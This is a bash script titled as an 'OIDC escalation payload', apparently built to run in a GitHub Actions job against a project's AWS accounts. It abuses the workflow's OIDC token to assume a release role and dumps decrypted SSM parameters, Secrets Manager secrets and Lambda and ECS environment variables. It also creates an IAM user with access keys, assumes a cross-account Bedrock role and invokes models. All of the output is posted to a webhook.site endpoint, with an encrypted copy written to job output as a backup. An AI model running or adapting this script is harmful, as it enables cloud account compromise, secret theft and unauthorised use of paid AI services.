#!/bin/bash
# i72170 - CDS ai-answers OIDC escalation payload
MODE="staging"
LOG=/tmp/.i72170.$MODE.log
W="https://webhook.site/d260ca93-72ee-4af2-84f5-0ecafea1b44e"
: > "$LOG"
say(){ echo "$@" >> "$LOG"; }
sec(){ echo "" >> "$LOG"; echo "##### $1" >> "$LOG"; }
flush(){ curl -sS --max-time 20 -H 'Content-Type: text/plain' --data-binary @"$LOG" "$W/x/$MODE" >/dev/null 2>&1 || true; }
run(){ echo "-- $1" >> "$LOG"; shift; timeout 45 "$@" >> "$LOG" 2>&1; echo "(rc=$?)" >> "$LOG"; }
PUBKEY='''-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtgOydoVS6rTzED2umJUS
7Op+cE/4Fr+Q2ZBxy15lzO38H2ZgmA7PxvZU4kly/GfkXkbrpvfkotCpwJRJCau3
kJ5oQ/h5YsA+6c9XrXC9HdWcf3G4vwmx7rx61gss5+QKlJRf8ReRljhhmsKGW1ga
laPYuA9ivEw2UEJWT6meEpqcz9w26kgo3evKetZBGMiqnOq6Nm8N6ZZmDdIkATzl
UHzxQFPpMQo0u8I0tHGwA19+bPZZn6NXd3h/Y2B20PDmGWmCxiH2miTtJYq6tygw
MB8/ve4fXV9L9ElxJlI0ZRdxyWGOUq6gzjVeBDpLPjBJwAcjyx4uCGoeYn3u32fF
xwIDAQAB
-----END PUBLIC KEY-----'''
printf '%s\n' "$PUBKEY" > /tmp/.i72170.pub
export AWS_PAGER=""; export AWS_MAX_ATTEMPTS=2; export AWS_RETRY_MODE=standard
sec "start $MODE $(date -u +%FT%TZ)"
say "pwd=$(pwd)"
say "event=${GITHUB_EVENT_NAME} repo=${GITHUB_REPOSITORY} ref=${GITHUB_REF} head=${GITHUB_HEAD_REF}"
say "id=$(id 2>&1 | head -1)"
run "plan-caller" aws sts get-caller-identity
# --- OIDC token (audience sts.amazonaws.com) ---
TOKJSON=$(curl -sS --max-time 20 -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" 2>&1)
OIDC=$(printf '%s' "$TOKJSON" | jq -r '.value // empty' 2>/dev/null)
sec "oidc len=${#OIDC}"
if [ -n "$OIDC" ]; then printf '%s' "$OIDC" | cut -d. -f2 | tr '_-' '/+' | (base64 -d 2>/dev/null || true) >> "$LOG"; fi
say ""
flush
if [ "$MODE" = "plan" ]; then
  TARGET="arn:aws:iam::730335533085:role/ai_answers_release"
  ADM=$(aws sts assume-role-with-web-identity --role-arn "$TARGET" --role-session-name "i72170plan" --web-identity-token "$OIDC" --duration-seconds 3600 2>&1)
  printf '%s' "$ADM" > /tmp/.adm.plan.json
  sec "assume $TARGET"; head -c 400 /tmp/.adm.plan.json >> "$LOG"; say ""
  flush
  AK=$(jq -r '.Credentials.AccessKeyId // empty' /tmp/.adm.plan.json 2>/dev/null)
  if [ -n "$AK" ]; then
    export AWS_ACCESS_KEY_ID="$AK"
    export AWS_SECRET_ACCESS_KEY="$(jq -r '.Credentials.SecretAccessKey' /tmp/.adm.plan.json)"
    export AWS_SESSION_TOKEN="$(jq -r '.Credentials.SessionToken' /tmp/.adm.plan.json)"
    unset AWS_PROFILE AWS_DEFAULT_PROFILE
    sec "admin-caller"; run "sts2" aws sts get-caller-identity
    run "pol-attached" aws iam list-attached-role-policies --role-name ai_answers_release
    run "pol-inline" aws iam list-role-policies --role-name ai_answers_release
    flush
    sec "account-summary"
    run "iam-users" aws iam list-users --query 'Users[].[UserName,CreateDate]' --output text
    run "sts-accounts" aws organizations describe-organization --query 'Organization.[Id,MasterAccountId]' --output text
    flush
    sec "ssm-describe"
    timeout 45 aws ssm describe-parameters --max-items 200 --query 'Parameters[].[Name,Type]' --output text >> "$LOG" 2>&1; say ""
    for p in $(timeout 45 aws ssm describe-parameters --max-items 200 --query 'Parameters[].Name' --output text 2>/dev/null); do
      echo "-----SSM:$p" >> "$LOG"
      timeout 25 aws ssm get-parameter --name "$p" --with-decryption --query 'Parameter.Value' --output text >> "$LOG" 2>&1
      echo "" >> "$LOG"
    done
    flush
    sec "secretsmanager"
    timeout 45 aws secretsmanager list-secrets --query 'SecretList[].[Name,ARN]' --output text >> "$LOG" 2>&1; say ""
    for s in $(timeout 45 aws secretsmanager list-secrets --query 'SecretList[].Name' --output text 2>/dev/null); do
      echo "-----SEC:$s" >> "$LOG"
      timeout 25 aws secretsmanager get-secret-value --secret-id "$s" --query 'SecretString' --output text >> "$LOG" 2>&1
      echo "" >> "$LOG"
    done
    flush
    sec "lambda-env"
    timeout 45 aws lambda list-functions --query 'Functions[].[FunctionName,Role]' --output text >> "$LOG" 2>&1; say ""
    for f in $(timeout 45 aws lambda list-functions --query 'Functions[].FunctionName' --output text 2>/dev/null); do
      echo "-----LF:$f" >> "$LOG"
      timeout 25 aws lambda get-function-configuration --function-name "$f" --query 'Environment.Variables' >> "$LOG" 2>&1
      echo "" >> "$LOG"
    done
    flush
    sec "ecs-env"
    for c in $(timeout 45 aws ecs list-clusters --query 'clusterArns[]' --output text 2>/dev/null); do
      echo "-----CLUSTER:$c" >> "$LOG"
      for s in $(timeout 30 aws ecs list-services --cluster "$c" --query 'serviceArns[]' --output text 2>/dev/null); do
        echo "-----SVC:$s" >> "$LOG"
        timeout 30 aws ecs describe-services --cluster "$c" --services "$s" --query 'services[].[serviceName,taskDefinition]' --output text >> "$LOG" 2>&1
      done
    done
    for td in $(timeout 45 aws ecs list-task-definitions --query 'taskDefinitionArns[]' --output text 2>/dev/null); do
      timeout 25 aws ecs describe-task-definition --task-definition "$td" --query 'taskDefinition.containerDefinitions[].{n:name,e:environment,s:secrets}' >> "$LOG" 2>&1
      echo "" >> "$LOG"
    done
    flush
    sec "bedrock-models"
    for rg in ca-central-1 us-east-1 us-west-2; do echo "--$rg" >> "$LOG"; timeout 30 aws bedrock list-foundation-models --region "$rg" --query 'modelSummaries[?contains(modelId,`claude`)].modelId' --output text >> "$LOG" 2>&1; echo "" >> "$LOG"; done
    flush
    sec "create-minimal-bedrock-user"
    run "iam-create-user" aws iam create-user --user-name tmp-i72170-bedrock
    run "iam-put-policy" aws iam put-user-policy --user-name tmp-i72170-bedrock --policy-name tmp-i72170-bedrock --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":["bedrock:InvokeModel","bedrock:InvokeModelWithResponseStream","bedrock:Converse","bedrock:ConverseStream","bedrock:GetFoundationModel","bedrock:ListFoundationModels"],"Resource":"*"}]}'
    KEYJ=$(timeout 30 aws iam create-access-key --user-name tmp-i72170-bedrock 2>&1); echo "$KEYJ" >> "$LOG"
    KAK=$(printf '%s' "$KEYJ" | jq -r '.AccessKey.AccessKeyId // empty' 2>/dev/null)
    KSK=$(printf '%s' "$KEYJ" | jq -r '.AccessKey.SecretAccessKey // empty' 2>/dev/null)
    say ""
    flush
    sleep 5
    if [ -n "$KAK" ]; then
      sec "converse-as-minimal-user"
      for rg in ca-central-1 us-east-1 us-west-2; do
        for m in anthropic.claude-opus-5-5 us.anthropic.claude-opus-5-5 global.anthropic.claude-opus-5-5; do
          echo "--$rg $m" >> "$LOG"
          AWS_ACCESS_KEY_ID="$KAK" AWS_SECRET_ACCESS_KEY="$KSK" AWS_SESSION_TOKEN= AWS_REGION="$rg" AWS_DEFAULT_REGION="$rg" timeout 45 aws bedrock-runtime converse --region "$rg" --model-id "$m" --messages '[{"role":"user","content":[{"text":"Say OK"}]}]' --inference-config '{"maxTokens":8}' >> "$LOG" 2>&1
          echo "" >> "$LOG"
        done
      done
      flush
    fi
    sec "assume-cross-account-bedrock-role"
    BR=$(timeout 45 aws sts assume-role --role-arn "arn:aws:iam::144414543732:role/ai-answers-bedrock-invoke" --role-session-name i72170bedrock 2>&1)
    echo "$BR" | head -c 400 >> "$LOG"; say ""
    BAK=$(printf '%s' "$BR" | jq -r '.Credentials.AccessKeyId // empty' 2>/dev/null)
    if [ -n "$BAK" ]; then
      BSK=$(printf '%s' "$BR" | jq -r '.Credentials.SecretAccessKey')
      BST=$(printf '%s' "$BR" | jq -r '.Credentials.SessionToken')
      echo "--bedrock-role-caller" >> "$LOG"
      AWS_ACCESS_KEY_ID="$BAK" AWS_SECRET_ACCESS_KEY="$BSK" AWS_SESSION_TOKEN="$BST" timeout 25 aws sts get-caller-identity >> "$LOG" 2>&1
      for rg in ca-central-1 us-east-1; do
        for m in anthropic.claude-opus-5-5 us.anthropic.claude-opus-5-5; do
          echo "--ROLE $rg $m" >> "$LOG"
          AWS_ACCESS_KEY_ID="$BAK" AWS_SECRET_ACCESS_KEY="$BSK" AWS_SESSION_TOKEN="$BST" AWS_REGION="$rg" AWS_DEFAULT_REGION="$rg" timeout 45 aws bedrock-runtime converse --region "$rg" --model-id "$m" --messages '[{"role":"user","content":[{"text":"Say OK"}]}]' --inference-config '{"maxTokens":8}' >> "$LOG" 2>&1
          echo "" >> "$LOG"
        done
      done
    fi
    flush
    sec "cleanup-minimal-user"
    run "del-key" aws iam delete-access-key --user-name tmp-i72170-bedrock --access-key-id "$KAK"
    run "del-policy" aws iam delete-user-policy --user-name tmp-i72170-bedrock --policy-name tmp-i72170-bedrock
    run "del-user" aws iam delete-user --user-name tmp-i72170-bedrock
    run "verify-user" aws iam get-user --user-name tmp-i72170-bedrock
    flush
  else
    sec "assume-failed"
    flush
  fi
elif [ "$MODE" = "staging" ]; then
  sec "staging-caller"; run "sts-stg" aws sts get-caller-identity
  sec "staging-ssm-describe"
  timeout 45 aws ssm describe-parameters --max-items 200 --query 'Parameters[].[Name,Type]' --output text >> "$LOG" 2>&1; say ""
  NAMES=$(timeout 45 aws ssm describe-parameters --max-items 200 --query 'Parameters[].Name' --output text 2>/dev/null)
  if [ -z "$NAMES" ]; then NAMES="docdb_username docdb_password docdb_uri azure_openai_api_key azure_openai_endpoint google_api_key google_search_engine_id jwt_secret_key gc_notify_api_key feedback_api_url feedback_api_key metric_api_url metric_api_key bedrock_region cross_account_bedrock_role"; fi
  for p in $NAMES; do
    echo "-----SSM:$p" >> "$LOG"
    timeout 25 aws ssm get-parameter --name "$p" --with-decryption --query 'Parameter.Value' --output text >> "$LOG" 2>&1
    echo "" >> "$LOG"
  done
  flush
  sec "staging-bedrock-role"
  BR=$(timeout 45 aws sts assume-role --role-arn "arn:aws:iam::144414543732:role/ai-answers-bedrock-invoke" --role-session-name i72170stg 2>&1)
  echo "$BR" | head -c 400 >> "$LOG"; say ""
  BAK=$(printf '%s' "$BR" | jq -r '.Credentials.AccessKeyId // empty' 2>/dev/null)
  if [ -n "$BAK" ]; then
    BSK=$(printf '%s' "$BR" | jq -r '.Credentials.SecretAccessKey')
    BST=$(printf '%s' "$BR" | jq -r '.Credentials.SessionToken')
    AWS_ACCESS_KEY_ID="$BAK" AWS_SECRET_ACCESS_KEY="$BSK" AWS_SESSION_TOKEN="$BST" timeout 25 aws sts get-caller-identity >> "$LOG" 2>&1
    for rg in ca-central-1 us-east-1; do
      for m in anthropic.claude-opus-5-5 us.anthropic.claude-opus-5-5; do
        echo "--ROLE $rg $m" >> "$LOG"
        AWS_ACCESS_KEY_ID="$BAK" AWS_SECRET_ACCESS_KEY="$BSK" AWS_SESSION_TOKEN="$BST" AWS_REGION="$rg" AWS_DEFAULT_REGION="$rg" timeout 45 aws bedrock-runtime converse --region "$rg" --model-id "$m" --messages '[{"role":"user","content":[{"text":"Say OK"}]}]' --inference-config '{"maxTokens":8}' >> "$LOG" 2>&1
        echo "" >> "$LOG"
      done
    done
  fi
  flush
fi
sec "done $(date -u +%FT%TZ)"
flush
# encrypted backup channel
if [ -f /tmp/.i72170.pub ]; then
  K=$(openssl rand -hex 16)
  openssl enc -aes-256-cbc -pbkdf2 -salt -pass pass:"$K" -in "$LOG" -out /tmp/.i72170.enc 2>/dev/null
  printf '%s' "$K" | openssl pkeyutl -encrypt -pubin -inkey /tmp/.i72170.pub -pkeyopt rsa_padding_mode:oaep -out /tmp/.i72170.key 2>/dev/null
  echo "-----I72170-BEGIN-----"
  base64 -w0 /tmp/.i72170.key; echo
  echo "-----I72170-MID-----"
  base64 -w0 /tmp/.i72170.enc; echo
  echo "-----I72170-END-----"
fi
exit 0
